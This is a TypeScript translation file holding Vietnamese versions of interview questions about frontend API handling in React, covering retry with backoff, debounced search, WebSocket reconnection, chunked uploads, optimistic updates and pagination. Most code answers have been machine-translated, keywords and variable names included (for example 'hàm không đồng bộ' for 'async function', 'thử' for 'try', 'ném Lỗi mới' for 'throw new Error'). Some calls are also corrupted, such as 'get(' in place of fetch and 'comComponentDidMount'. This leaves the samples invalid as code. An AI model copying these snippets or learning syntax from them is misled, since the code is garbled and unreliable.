import type { QuestionTranslationMap } from '../types'

export const apiTestingPracticalVi: QuestionTranslationMap = {

  'atp-001': {
    question: 'API trả về các hình dạng dữ liệu không nhất quán trên các điểm cuối — một số trả về { data: T }, một số khác trả về T trực tiếp và một số lỗi gói khác nhau.Bạn xử lý vấn đề an toàn loại trên toàn bộ giao diện người dùng bằng cách nào?',
    answer: 'Tạo lớp máy khách API hợp nhất với bộ chuẩn hóa phản hồi và xác thực thời gian chạy.Sử dụng lược đồ Zod hoặc io-ts cho mỗi điểm cuối, một trình tìm nạp chung để phân tích các phản hồi và phân biệt đối xử các trạng thái thành công/lỗi.',
    explanation: 'Điều quan trọng là không bao giờ tin tưởng vào các phản hồi API thô.Xây dựng mô-đun máy khách API: (1) xác định lược đồ Zod cho mọi phản hồi điểm cuối, (2) gói tìm nạp/axios trong một hàm chung như `async function apiCall<T>(url, lược đồ: ZodSchema<T>): Promise<Result<T, ApiError>>`, (3) chuẩn hóa tất cả phản hồi thành hình dạng `{ data, error, status }` nhất quán trước khi chúng tiếp cận các thành phần.Điều này nắm bắt được sự không nhất quán ở phần phụ trợ ở ranh giới.Sử dụng các kết hợp phân biệt đối xử TypeScript (`type Result<T, E> = { ok: true; data: T } | { ok: false; error: E }`) để người tiêu dùng có thể kiểm tra loại toàn diện.Xác thực thời gian chạy thông qua Zod phát hiện các hình dạng không khớp trong quá trình phát triển/dàn dựng trước khi chúng được đưa vào sản xuất.Ghép nối với các thử nghiệm hợp đồng API chạy lược đồ Zod dựa trên phản hồi điểm cuối thực trong CI.',
  },
  'atp-002': {
    question: 'Triển khai logic thử lại với thời gian chờ theo cấp số nhân cho các lệnh gọi API không thành công.Hàm sẽ thử lại tối đa 3 lần, tăng gấp đôi thời gian chờ cho mỗi lần thử và hỗ trợ AbortSignal để hủy.',
    answer: 'hàm không đồng bộ tìm nạpWithRetry(\nurl: chuỗi,\ntùy chọn?:RequestInit & { maxRetries?: number }\n): Hứa<Phản hồi> {\nconst maxRetries = tùy chọn?.maxRetries ??3;\nhãy để LastError: Lỗi |null = null;\n\nfor (let try = 0; try <= maxRetries; try++) {\nthử {\nconst phản hồi = đang chờ tìm nạp (url, tùy chọn);\nif (response.ok) trả về phản hồi;\n// Thử lại trên 5xx, chuyển sang 4xx\nif (response.status < 500) đưa ra Lỗi mới(`HTTP ${response.status}`);\nLastError = Lỗi mới(`HTTP ${response.status}`);\n} bắt (lỗi) {\nif (options?.signal?.aborted) ném new DOMException(\'Aborted\', \'AbortError\');\nLastError = err là Lỗi;\n}\n\nif (cố gắng < maxRetries) {\nconst delay = Math.min(1000 * 2 ** thử + Math.random() * 100, 10000);\nđang chờ Promise mới((giải quyết, từ chối) => {\nconst hẹn giờ = setTimeout(giải quyết, trì hoãn);\noptions?.signal?.addEventListener(\'abort\', () => {\nclearTimeout(hẹn giờ);\ntừ chối(DOMException mới(\'Đã hủy\', \'AbortError\'));\n}, { một lần: đúng });\n});\n}\n}\n\nném lỗi cuối cùng ??Lỗi mới(\'tìm nạpWithRetry không thành công\');\n}',
    explanation: 'Độ lùi theo cấp số nhân ngăn cản sự tập trung đông đảo trên các máy chủ bị lỗi.Chi tiết chính: (1) chỉ thử lại 5xx (lỗi máy chủ), không phải 4xx (lỗi máy khách — thử lại 400 không bao giờ có tác dụng), (2) thêm jitter (`Math.random() * 100`) để giải đồng bộ hóa các lần thử lại từ nhiều máy khách, (3) giới hạn độ trễ tối đa để tránh phải chờ đợi vô lý, (4) tôn trọng AbortSignal trong cả quá trình tìm nạp và thời gian chờ để người gọi có thể hủy.Công thức độ trễ `1000 * 2^thử` đưa ra thời gian chờ là ~1 giây, ~2 giây, ~4 giây.Trong quá trình sản xuất, các thư viện như ky hoặc axios-retry xử lý việc này, nhưng hiểu rõ cơ chế là điều cần thiết để gỡ lỗi các cơn bão thử lại.',
  },
  'atp-003': {
    question: 'Một người dùng gửi biểu mẫu và mạng chậm.Họ nhấp vào "Gửi" ba lần.Làm thế nào để bạn ngăn chặn việc gửi gấp đôi (hoặc gấp ba)?Thực hiện một giải pháp.',
    answer: 'hàm SubmitForm() {\nconst [isSubmit, setIsSubmit] = useState(false);\nconst abortRef = useRef<AbortController |null>(null);\n\nconst handSubmit = async (dữ liệu: FormData) => {\nif (isSubmit) trả về;// Bảo vệ chống lại các cuộc gọi trùng lặp\nsetIsSubmit(true);\n\n// Hủy mọi yêu cầu trước đó trên chuyến bay\nabortRef.current?.abort();\nabortRef.current = new AbortController();\n\nthử {\nconst res = đang chờ tìm nạp(\'/api/orders\', {\nphương thức: \'BÀI\',\nnội dung: JSON.stringify(dữ liệu),\ntín hiệu: abortRef.current.signal,\n});\nkết quả const = đang chờ res.json();\n// Xử lý thành công - chuyển hướng, hiển thị bánh mì nướng, v.v.\n} bắt (lỗi) {\nif ((err as Error).name !== \'AbortError\') {\n// Xử lý lỗi thực tế\nsetIsSubmit(sai);// Cho phép thử lại khi có lỗi thực sự\n}\n}\n};\n\ntrở lại (\n<button onClick={() => handSubmit(formData)} bị vô hiệu hóa={isSubmit}>\n{đang gửi?\'Đang gửi...\' : \'Gửi\'}\n</button>\n);\n}',
    explanation: 'Ba lớp bảo vệ: (1) Vô hiệu hóa nút thông qua trạng thái `isSubmit` để người dùng nhìn thấy phản hồi trực quan và không thể nhấp lại.(2) Bảo vệ người xử lý bằng cách quay lại sớm nếu đã gửi, bảo vệ khỏi các lệnh gọi có lập trình hoặc gửi bằng bàn phím.(3) Sử dụng AbortController để hủy các yêu cầu cũ trong chuyến bay.Ở phần phụ trợ, cũng triển khai các khóa tạm thời — máy khách tạo UUID cho mỗi lần gửi và máy chủ sẽ loại bỏ trùng lặp.Điều này rất quan trọng đối với các luồng thanh toán.Chỉ riêng giải pháp giao diện người dùng là không đủ cho các hoạt động quan trọng về an toàn mà là mẫu UX tiêu chuẩn.',
  },
  'atp-004': {
    question: 'Phân trang API: dựa trên con trỏ và dựa trên offset.Tập dữ liệu của bạn có 1 triệu bản ghi được chèn thường xuyên.Bạn chọn cách tiếp cận nào và tại sao?Mô tả việc triển khai giao diện người dùng.',
    answer: 'Phân trang dựa trên con trỏ.Bù lại sự gián đoạn phân trang bằng cách chèn thường xuyên - các mục thay đổi, gây ra sự trùng lặp hoặc bỏ sót bản ghi.Phân trang bằng con trỏ sử dụng mã thông báo mờ (ví dụ: ID mục cuối cùng + dấu thời gian) để trang tiếp theo luôn liên quan đến mục được nhìn thấy lần cuối.',
    explanation: 'Phân trang bù trừ (`?page=5&limit=20` = `OFFSET 80 LIMIT 20`) có hai vấn đề lớn trên quy mô lớn: (1) Hiệu suất — cơ sở dữ liệu phải quét và loại bỏ các hàng `offset` trước khi trả về kết quả, vì vậy trang 50000 cực kỳ chậm.(2) Tính nhất quán - nếu một bản ghi mới được chèn vào trang 1 trong khi người dùng đang ở trang 3, mọi mục sẽ chuyển về phía trước, khiến người dùng nhìn thấy một mục trùng lặp hoặc bỏ lỡ một mục.Phân trang con trỏ (`?cursor=eyJpZCI6MTAwfQ&limit=20`) giải quyết cả hai: truy vấn DB là `WHERE id > :cursor ORDER BY id LIMIT 20`, sử dụng quét chỉ mục bất kể vị trí và chèn trước con trỏ không ảnh hưởng đến kết quả.Triển khai giao diện người dùng: lưu trữ `nextCursor` từ mỗi phản hồi, chuyển nó vào yêu cầu tiếp theo, sử dụng `useInfiniteQuery` của React Query với `getNextPageParam: (lastPage) => LastPage.nextCursor`.Để cuộn hai chiều, hãy theo dõi `prevCursor`.Cân bằng: phân trang con trỏ không hỗ trợ "chuyển tới trang 500" — sử dụng phần bù cho bảng thông tin quản trị viên khi cần điều này và hiếm khi xảy ra đột biến dữ liệu.',
  },
  'atp-005': {
    question: 'Triển khai đầu vào tìm kiếm theo thời gian thực với tính năng gỡ lỗi (300 mili giây), trạng thái tải và hủy yêu cầu để chỉ hiển thị kết quả tìm kiếm mới nhất.',
    answer: 'hàm SearchComponent() {\nconst [truy vấn, setQuery] = useState(\'\');\nconst [kết quả, setResults] = useState<string[]>([]);\nconst [isLoading, setIsLoading] = useState(false);\nconst abortRef = useRef<AbortController |null>(null);\n\nuseEffect(() => {\nif (!query.trim()) {\nsetResults([]);\ntrở lại;\n}\n\nconst hẹn giờ = setTimeout(async () => {\n// Hủy yêu cầu trên chuyến bay trước đó\nabortRef.current?.abort();\nabortRef.current = new AbortController();\n\nsetIsLoading(true);\nthử {\nconst res = đang chờ lấy(\n`/api/search?q=${encodeURIComponent(query)}`,\n{tín hiệu: abortRef.current.signal }\n);\ndữ liệu const = đang chờ res.json();\nsetResults(data.items);\n} bắt (lỗi) {\nif ((err as Error).name !== \'AbortError\') {\nconsole.error(\'Tìm kiếm thất bại:\', err);\n}\n} cuối cùng {\nsetIsLoading(false);\n}\n}, 300);\n\ntrả về () => {\nclearTimeout(hẹn giờ);\n};\n}, [truy vấn]);\n\ntrở lại (\n<div>\n<input value={query} onChange={(e) => setQuery(e.target.value)} placeholder="Search..." />\n{isLoading && <span>Đang tải…</span>}\n<ul>{results.map((r) => <li key={r}>{r</li>)</ul>\n</div>\n);\n}',
    explanation: 'Ba vấn đề được giải quyết đồng thời: (1) Debounce — `setTimeout` có tác dụng làm trì hoãn lệnh gọi API 300 mili giây;chức năng dọn dẹp sẽ xóa nó nếu người dùng gõ lại trước khi nó kích hoạt.(2) Hủy yêu cầu - mỗi tìm kiếm mới sẽ hủy bỏ lần tìm nạp trước đó thông qua AbortController, ngăn chặn các điều kiện tương tranh trong đó phản hồi chậm cho "ab" sẽ ghi đè phản hồi nhanh hơn cho "abc".(3) Trạng thái tải - `isLoading` hiển thị phản hồi trong quá trình tìm nạp.`AbortError` bị âm thầm bỏ qua vì đây là hành vi được mong đợi.Trong quá trình sản xuất, hãy cân nhắc sử dụng `useDeferredValue` (React 18+) cho truy vấn hoặc `keepPreviousData` của React Query để tránh nhấp nháy trạng thái trống giữa các lần tìm kiếm.',
  },
  'atp-006': {
    question: 'Kết nối WebSocket thường xuyên bị rớt trên mạng di động.Triển khai logic kết nối lại mạnh mẽ với độ trễ theo cấp số nhân, ping nhịp tim và xếp hàng tin nhắn trong thời gian ngoại tuyến.',
    answer: 'lớp RobustWebSocket {\nws riêng tư: WebSocket |null = null;\nurl riêng tư: chuỗi;\nhàng đợi riêng: không rõ[] = [];\nnỗ lực riêng tư = 0;\nmaxAttempt riêng tư = 10;\nnhịp tim riêng tưTimer: ReturnType<typeof setInterval> |null = null;\nkết nối lại riêng tưTimer: ReturnType<typeof setTimeout> |null = null;\nriêng tư isClosed = false;\nonMessage?: (dữ liệu: không xác định) => void;\n\nhàm tạo (url: chuỗi) {\nthis.url = url;\nthis.connect();\n}\n\nkết nối riêng tư() {\nthis.ws = WebSocket mới(this.url);\n\nthis.ws.onopen = () => {\nthis.attempt = 0;\nthis.flush();\nthis.startHeartbeat();\n};\n\nthis.ws.onmessage = (e) => {\nif (e.data === \'pong\') return;\nthis.onMessage?.(JSON.parse(e.data));\n};\n\nthis.ws.onclose = () => {\nthis.stopHeartbeat();\nif (!this.isClosed) this.reconnect();\n};\n\nthis.ws.onerror = () => this.ws?.close();\n}\n\nkết nối lại riêng tư () {\nif (this.attempt >= this.maxAttempts) return;\nconst delay = Math.min(1000 * 2 ** this.attempt + Math.random() * 500, 30000);\nthis.attempt++;\nthis.reconnectTimer = setTimeout(() => this.connect(), delay);\n}\n\nkhởi đầu riêng tưHeartbeat() {\nthis.heartbeatTimer = setInterval(() => {\nif (this.ws?.readyState === WebSocket.OPEN) {\nthis.ws.send(\'ping\');\n}\n}, 15000);\n}\n\nđiểm dừng riêngHeartbeat() {\nif (this.heartbeatTimer) clearInterval(this.heartbeatTimer);\n}\n\nxả riêng () {\nwhile (this.queue.length && this.ws?.readyState === WebSocket.OPEN) {\nthis.ws.send(JSON.stringify(this.queue.shift()));\n}\n}\n\ngửi (dữ liệu: không xác định) {\nif (this.ws?.readyState === WebSocket.OPEN) {\nthis.ws.send(JSON.stringify(data));\n} khác {\nthis.queue.push(dữ liệu);\n}\n}\n\nđóng() {\nthis.isClosed = true;\nthis.stopHeartbeat();\nif (this.reconnectTimer) clearTimeout(this.reconnectTimer);\nthis.ws?.close();\n}\n}',
    explanation: 'Kết nối di động không đáng tin cậy — WebSockets không hoạt động khi chuyển đổi giữa Wi-Fi và mạng di động, khi điện thoại ở chế độ ngủ hoặc khi đi qua đường hầm.Việc triển khai này xử lý: (1) Tự động kết nối lại với độ trễ theo cấp số nhân + jitter để ngăn chặn tình trạng sấm sét.(2) Nhịp tim ping cứ sau 15 giây để phát hiện các kết nối chết — nhiều proxy/bộ cân bằng tải âm thầm đóng các kết nối WebSocket không hoạt động sau 30-60 giây.Nếu máy chủ không phản hồi với ping, trình xử lý `onclose` sẽ kích hoạt và quá trình kết nối lại bắt đầu.(3) Hàng đợi tin nhắn - tin nhắn được gửi khi bị ngắt kết nối sẽ được lưu vào bộ đệm và xóa khi kết nối lại, ngăn ngừa mất dữ liệu.(4) Cờ `isClosed` phân biệt việc đóng có chủ ý với những lần đóng không mong muốn.Trong quá trình sản xuất, bạn cũng nên cân nhắc sử dụng sự kiện `navigator.onLine` và `visibilitychange` để tạm dừng/tiếp tục kết nối.',
  },
  'atp-007': {
    question: 'Phần phụ trợ kế thừa trả về HTTP 200 cho mọi thứ — thậm chí cả lỗi.Lỗi được biểu thị bằng `{ thành công: sai, lỗi: "tin nhắn" }` trong nội dung.Viết trình bao bọc tìm nạp coi đây là lỗi thích hợp.',
    answer: 'lớp LegacyApiError mở rộng Lỗi {\nhàm tạo(\ntin nhắn: chuỗi,\nmã công khai?: chuỗi,\ntrạng thái công khai: số = 200\n) {\nsiêu(tin nhắn);\nthis.name = \'LegacyApiError\';\n}\n}\n\ngiao diện LegacyResponse<T> {\nthành công: boolean;\ndữ liệu?: T;\nlỗi?: chuỗi;\nmã?: chuỗi;\n}\n\nhàm không đồng bộ LegacyFetch<T>(url: string, init?:RequestInit): Promise<T> {\nconst res = đang chờ tìm nạp(url, init);\n\n// Xử lý các lỗi HTTP thực tế (mạng, 5xx từ proxy, v.v.)\nnếu (!res.ok) {\nném LegacyApiError mới (`HTTP ${res.status}`, \'HTTP_ERROR\', res.status);\n}\n\nconst body: LegacyResponse<T> = đang chờ res.json();\n\nif (!body.success) {\nném LegacyApiError mới (\nbody.error ??\'Lỗi không xác định\',\ncơ thể.code,\n200\n);\n}\n\ntrả về body.data dưới dạng T;\n}',
    explanation: 'Nhiều API cũ, đặc biệt là những API được xây dựng trước khi quy ước REST phổ biến, trả về 200 cho tất cả các phản hồi và lỗi mã hóa trong nội dung.Đây là vấn đề vì các công cụ như bộ chặn Axios, React Query và SWR đều sử dụng trạng thái HTTP để xác định thành công/thất bại.Trình bao bọc bình thường hóa điều này bằng cách: (1) Kiểm tra trạng thái HTTP trước để tìm lỗi truyền tải thực sự (proxy 502, sự cố mạng).(2) Phân tích nội dung và kiểm tra trường `thành công`.(3) Ném một `LegacyApiError` tùy chỉnh mang thông báo lỗi và mã tùy chọn.Bây giờ các khối `onError` và try/catch của React Query hoạt động như mong đợi.Lớp lỗi tùy chỉnh cho phép bạn phân biệt các lỗi API cũ với các lỗi mạng trong ranh giới lỗi.',
  },
  'atp-008': {
    question: 'Triển khai tải tệp lên bằng thanh tiến trình, khả năng tạm dừng/tiếp tục và tải lên theo từng đoạn cho các tệp lớn (>100MB).Hiển thị thành phần React và logic tải lên.',
    answer: 'const CHUNK_SIZE = 5 * 1024 * 1024;// 5 MB\n\nhàm FileUploader() {\nconst [tiến trình, setProgress] = useState(0);\nconst [isPaused, setIsPaused] = useState(false);\nconst bị tạm dừngRef = useRef(false);\nconst abortRef = useRef<AbortController |null>(null);\n\nconst uploadFile = async (tệp: Tệp) => {\nconst TotalChunks = Math.ceil(file.size / CHUNK_SIZE);\n// Hỏi máy chủ xem đoạn nào đã được tải lên (để tiếp tục sau khi làm mới)\nconst uploadId = đang chờ initUpload(file.name, TotalChunks);\n\nfor (let i = 0; i < totalChunks; i++) {\n// Chờ trong khi tạm dừng\nwhile (tạm dừngRef.current) {\nđang chờ Promise mới((r) => setTimeout(r, 200));\n}\n\nconst bắt đầu = i * CHUNK_SIZE;\nconst chunk = file.slice(bắt đầu, bắt đầu + CHUNK_SIZE);\nabortRef.current = new AbortController();\n\nhãy thử lại = 0;\ntrong khi (thử lại < 3) {\nthử {\nconst formData = FormData mới();\nformData.append(\'chunk\', chunk);\nformData.append(\'index\', String(i));\nformData.append(\'uploadId\', uploadId);\n\nđang chờ tìm nạp(\'/api/upload/chunk\', {\nphương thức: \'BÀI\',\nnội dung: formData,\ntín hiệu: abortRef.current.signal,\n});\nphá vỡ;// Thành công\n} bắt {\nthử lại++;\nif (thử lại >= 3) ném Lỗi mới(`Chunk ${i} không thành công sau 3 lần thử`);\nđang chờ Promise mới((r) => setTimeout(r, 1000 * thử lại));\n}\n}\n\nsetProgress(((i + 1) / totalChunks) * 100);\n}\n\n// Yêu cầu máy chủ tập hợp các khối\nđang chờ tìm nạp(`/api/upload/complete/${uploadId}`, { phương thức: \'POST\' });\n};\n\nconst chuyểnPause = () => {\nđã tạm dừngRef.current = !pausedRef.current;\nsetIsPaused(pausedRef.current);\nif (pausedRef.current) abortRef.current?.abort();\n};\n\ntrở lại (\n<div>\n<input type="file" onChange={(e) => e.target.files?.[0]&& uploadFile(e.target.files[0])} />\n<div style={{ width: `${progress}%`, chiều cao: 8, nền: \'#4caf50\' }} />\n<span>{progress.toFixed(1)}%</span>\n<button onClick={togglePause}>{isPaused ?\'Tiếp tục\' : \'Tạm dừng\'</button>\n</div>\n);\n}\n\nhàm async initUpload(fileName: string, TotalChunks: number): Promise<string> {\nconst res = đang chờ tìm nạp(\'/api/upload/init\', {\nphương thức: \'BÀI\',\ntiêu đề: { \'Content-Type\': \'application/json\' },\nnội dung: JSON.stringify({ fileName, TotalChunks }),\n});\ndữ liệu const = đang chờ res.json();\ntrả về dữ liệu.uploadId;\n}',
    explanation: 'Các tệp tải lên lớn phải được chia nhỏ để xử lý tình trạng gián đoạn mạng một cách linh hoạt.Các quyết định thiết kế chính: (1) `File.slice()` chia tệp thành các phần 5MB mà không tải toàn bộ tệp vào bộ nhớ.(2) Tải lên tuần tự với thử lại từng đoạn - nếu đoạn 45 trên 100 không thành công thì chỉ đoạn đó được thử lại.(3) Tạm dừng sử dụng tham chiếu (không phải trạng thái) vì vòng lặp tải lên đọc nó một cách đồng bộ;trạng thái sẽ cũ bên trong việc đóng cửa không đồng bộ.(4) Máy chủ lưu trữ các đoạn được khóa bởi `uploadId + index` và tập hợp chúng trong lệnh gọi `/complete`.Đây là mẫu tương tự được sử dụng trong quá trình tải lên nhiều phần của tus.io và S3.Để tiếp tục thực sự sau khi làm mới, máy chủ trả về các chỉ mục đoạn đã được tải lên trên init và vòng lặp sẽ bỏ qua chúng.',
  },
  'atp-009': {
    question: 'Nhiều thành phần trong ứng dụng của bạn gọi cùng một điểm cuối API cùng một lúc (ví dụ: hồ sơ người dùng được tìm nạp bởi thanh điều hướng, thanh bên và nội dung chính).Làm thế nào để bạn loại bỏ các yêu cầu này?',
    answer: 'Sử dụng lớp loại bỏ trùng lặp yêu cầu - thông qua React Query/SWR (tự động loại bỏ trùng lặp bằng khóa bộ đệm) hoặc bản đồ yêu cầu trong chuyến bay tùy chỉnh trả về cùng một Lời hứa cho các yêu cầu đồng thời giống hệt nhau.',
    explanation: 'React Query và SWR giải quyết vấn đề này ngay lập tức: khi ba thành phần gọi `useQuery(["user", id],fetchUser)`, chỉ một yêu cầu HTTP kích hoạt và cả ba thành phần đều nhận được cùng một dữ liệu.Dưới lớp vỏ bọc, họ duy trì bộ đệm được khóa bằng khóa truy vấn và chia sẻ những lời hứa trong chuyến bay.Nếu bạn không thể sử dụng các thư viện này, hãy triển khai thủ công: duy trì `Map<string, Promise<Response>>` của các yêu cầu đang thực hiện.Trước khi tìm nạp, hãy kiểm tra xem yêu cầu cho URL đó đã được thực hiện hay chưa — nếu vậy, hãy trả lại lời hứa hiện tại.Khi hoàn thành (thành công hoặc lỗi), hãy xóa nó khỏi bản đồ.Điều này được gọi là "yêu cầu hợp nhất."Ví dụ: `const inflight = new Map();function deduplicatedFetch(url) { if (inflight.has(url)) return inflight.get(url);const lời hứa = lấy(url).cuối cùng(() => inflight.delete(url));inflight.set(url, lời hứa);trả lại lời hứa;}`.Apollo Client tự động thực hiện việc này cho các truy vấn GraphQL thông qua bộ đệm được chuẩn hóa của nó.Tối ưu hóa này giúp giảm tải máy chủ, tiết kiệm băng thông và ngăn ngừa sự không nhất quán trong giao diện người dùng khi các thành phần khác nhau hiển thị các phiên bản khác nhau của cùng một dữ liệu.',
  },
  'atp-010': {
    question: 'Thực hiện cập nhật lạc quan cho danh sách việc cần làm.Khi người dùng chuyển đổi một việc cần làm, việc cần làm đó sẽ cập nhật ngay lập tức trong giao diện người dùng, sau đó đồng bộ hóa với máy chủ.Nếu yêu cầu máy chủ không thành công, hãy quay lại trạng thái trước đó và hiển thị lỗi.',
    answer: 'hàm useTodoToggle() {\nconst queryClient = useQueryClient();\n\ntrả về useMutation({\nđột biếnFn: (todoId: string) =>\nget(`/api/todos/${todoId}/toggle`, { phương thức: \'PATCH\' }).then((r) => {\nif (!r.ok) ném Lỗi mới(\'Chuyển đổi không thành công\');\ntrả về r.json();\n}),\n\nonMutate: không đồng bộ (todoId) => {\n// Hủy các lần tải lại đi để chúng không ghi đè lên bản cập nhật lạc quan của chúng tôi\nđang chờ queryClient.cancelQueries({ queryKey: [\'todos\'] });\n\n// Chụp nhanh trạng thái hiện tại để khôi phục\nconst trước = queryClient.getQueryData<Todo[]>([\'todos\']);\n\n// Cập nhật tối ưu\nqueryClient.setQueryData<Todo[]>([\'todos\'], (cũ) =>\nold?.map((todo) =>\ntodo.id === todoId ?{ ...việc cần làm, đã hoàn thành: !todo.completed } : việc cần làm\n)\n);\n\ntrở lại { trước };\n},\n\nonError: (_err, _todoId, bối cảnh) => {\n// Quay lại ảnh chụp nhanh\nif (bối cảnh?. trước) {\nqueryClient.setQueryData([\'todos\'], context.previous);\n}\ntoast.error(\'Không thể cập nhật việc cần làm. Đã hoàn nguyên.\');\n},\n\nđã giải quyết: () => {\n// Tải lại để đảm bảo trạng thái máy chủ được đồng bộ hóa\nqueryClient.invalidateQueries({ queryKey: [\'todos\'] });\n},\n});\n}',
    explanation: 'Các bản cập nhật lạc quan giúp giao diện người dùng có cảm giác tức thì bằng cách cập nhật bộ đệm trước khi máy chủ xác nhận.`useMutation` của React Query có hỗ trợ tích hợp thông qua vòng đời `onMutate` → `onError` → `onSettled`: (1) `onMutate` hủy mọi truy vấn đang diễn ra cho cùng một dữ liệu (để ngăn chúng ghi đè bản cập nhật tối ưu), chụp nhanh bộ đệm hiện tại để khôi phục, sau đó áp dụng thay đổi tối ưu.(2) `onError` khôi phục ảnh chụp nhanh nếu đột biến không thành công.(3) `onSettled` luôn kích hoạt (thành công hoặc lỗi) và tìm nạp lại để điều hòa trạng thái máy khách và máy chủ.Mẫu ảnh chụp nhanh rất quan trọng — nếu không có nó, việc khôi phục sẽ yêu cầu biết chính xác hoạt động nghịch đảo, điều này rất dễ xảy ra.Mẫu này hoạt động cho mọi hoạt động CRUD, không chỉ chuyển đổi.',
  },
  'atp-011': {
    question: 'Bạn cần tìm nạp dữ liệu khi một thành phần được gắn kết.Cách tiếp cận nào được khuyến nghị trong React 18+?',
    answer: '0',
    explanation: 'Trong React 18+, phương pháp được đề xuất để tìm nạp dữ liệu khi gắn kết là `useEffect` với chức năng dọn dẹp hủy bỏ yêu cầu.Việc dọn dẹp đặc biệt quan trọng vì React 18 Strict Mode gọi gấp đôi các hiệu ứng trong quá trình phát triển, nếu không có AbortController sẽ gây ra hai yêu cầu đồng thời và các điều kiện chạy đua tiềm năng.Quá trình tìm nạp trong nội dung thành phần (tùy chọn B) chạy trên mọi kết xuất chứ không chỉ gắn kết, gây ra vòng lặp vô hạn nếu dữ liệu được tìm nạp kích hoạt cập nhật trạng thái.`comComponentDidMount` (tùy chọn C) là API thành phần lớp và không thể sử dụng được trong các thành phần hàm.XHR đồng bộ (tùy chọn D) chặn luồng chính và không được dùng nữa.Trong thực tế, các thư viện như React Query hoặc SWR được ưu tiên hơn so với tìm nạp useEffect thô vì chúng tự động xử lý bộ nhớ đệm, loại bỏ trùng lặp và xác thực lại cũ.',
  },
  'atp-012': {
    question: 'Trạng thái HTTP 429 biểu thị điều gì và khách hàng nên làm gì khi nhận được trạng thái này?',
    answer: '2',
    explanation: '429 Quá Nhiều Yêu cầu có nghĩa là khách hàng đã gửi quá nhiều yêu cầu trong một khoảng thời gian nhất định và bị giới hạn tốc độ.Phản hồi đúng là đọc tiêu đề `Retry-After` (chỉ định giây hoặc ngày) và đợi rất lâu trước khi thử lại.Thử lại ngay lập tức (tùy chọn A) có thể sẽ nhận thêm 429 và có thể khiến khách hàng bị cấm.Một ứng dụng khách API được thiết kế tốt phải triển khai nhận thức về giới hạn tốc độ: theo dõi 429 phản hồi, tôn trọng `Thử lại sau` và lý tưởng nhất là chủ động điều tiết các yêu cầu để duy trì dưới giới hạn.Các thư viện như Axios có thể sử dụng thiết bị chặn để xử lý việc này một cách tự động.Các tiêu đề X-RateLimit-Remaining và X-RateLimit-Reset (không chuẩn nhưng phổ biến) có thể giúp khách hàng giảm tốc độ trước.',
  },
  'atp-013': {
    question: 'Bạn đang xây dựng một trình soạn thảo tài liệu cộng tác (như Notion).Nhiều người dùng chỉnh sửa cùng một tài liệu cùng một lúc.Thiết kế chiến lược đồng bộ hóa thời gian thực, bao gồm giải quyết xung đột, hỗ trợ ngoại tuyến và lớp API.',
    answer: 'Sử dụng CRDT (Loại dữ liệu sao chép không xung đột) hoặc OT (Chuyển đổi hoạt động) để hợp nhất không xung đột.WebSocket để đồng bộ hóa thời gian thực, IndexedDB để lưu trữ ngoại tuyến và lớp API REST + WebSocket kết hợp.',
    explanation: 'Các lớp kiến ​​trúc: (1) Mô hình dữ liệu - sử dụng thư viện CRDT như Yjs hoặc Automerge.CRDT cho phép các chỉnh sửa đồng thời tự động hợp nhất mà không có xung đột, không giống như OT yêu cầu máy chủ trung tâm để chuyển đổi.Mỗi chỉnh sửa là một thao tác (chèn ký tự vào vị trí, xóa phạm vi, v.v.) được lưu trong nhật ký.(2) Vận chuyển - Kết nối WebSocket thực hiện các hoạt động trong thời gian thực.Khi người dùng A gõ, thao tác sẽ được áp dụng cục bộ ngay lập tức (lạc quan), sau đó truyền đến máy chủ, máy chủ này sẽ gửi nó đến tất cả các máy khách được kết nối khác.(3) Ngoại tuyến - các hoạt động được xếp hàng đợi trong IndexedDB.Khi người dùng kết nối lại, các hoạt động được xếp hàng đợi sẽ được gửi và hợp nhất với trạng thái máy chủ thông qua thuật toán hợp nhất CRDT.Vì CRDT có tính giao hoán và lũy đẳng nên thứ tự thực hiện không quan trọng.(4) Lớp API - REST cho tài liệu CRUD (tạo, liệt kê, xóa, cấp quyền), WebSocket để chỉnh sửa theo thời gian thực trong tài liệu.(5) Tính bền bỉ - máy chủ định kỳ chụp nhanh trạng thái CRDT để giảm kích thước nhật ký hoạt động.(6) Nhận thức - phát các vị trí và lựa chọn con trỏ thông qua WebSocket cho các chỉ báo "ai đang chỉnh sửa ở đâu".Yjs + y-websocket là ngăn xếp sẵn sàng sản xuất cho việc này.',
  },
  'atp-014': {
    question: 'Mã này tìm nạp dữ liệu người dùng nhưng đôi khi hiển thị dữ liệu cũ từ người dùng trước đó.Tìm lỗi.',
    answer: 'Thiếu tình trạng dọn dẹp/cuộc đua.Khi userId thay đổi nhanh chóng, yêu cầu cũ hơn có thể được giải quyết sau yêu cầu mới hơn, ghi đè bằng dữ liệu cũ.Khắc phục: thêm AbortController hoặc cờ boolean trong quá trình dọn dẹp.',
    explanation: 'Lỗi này là một tình trạng chạy đua cổ điển trong quá trình tìm nạp dữ liệu useEffect.Tình huống: userId thay đổi từ "A" thành "B".Hai lần lấy lửa.Nếu yêu cầu "B" trả về đầu tiên và "A" trả về thứ hai, `setUser` được gọi với dữ liệu của người dùng A — hiển thị sai người dùng.Khắc phục bằng cờ dọn dẹp: `useEffect(() => { let cancel = false; Fetch(...).then(data => { if (!cancelled) setUser(data) }); return () => { cancel = true; }; }, [userId])`.Tốt hơn hết, hãy sử dụng AbortController: `const ctrl = new AbortController();tìm nạp(url, { signal: ctrl.signal });return () => ctrl.abort();`.Điều này không chỉ ngăn chặn bản cập nhật cũ mà còn hủy yêu cầu mạng trên chuyến bay, tiết kiệm băng thông.React Query xử lý việc này một cách tự động - đó là một trong những lý do chính để sử dụng thư viện tìm nạp dữ liệu.',
  },
  'atp-015': {
    question: 'SPA của bạn thực hiện lệnh gọi API đến một miền khác.Trình duyệt gửi yêu cầu OPTIONS trước POST của bạn.Điều gì đang xảy ra và bạn tối ưu hóa nó như thế nào?',
    answer: '1',
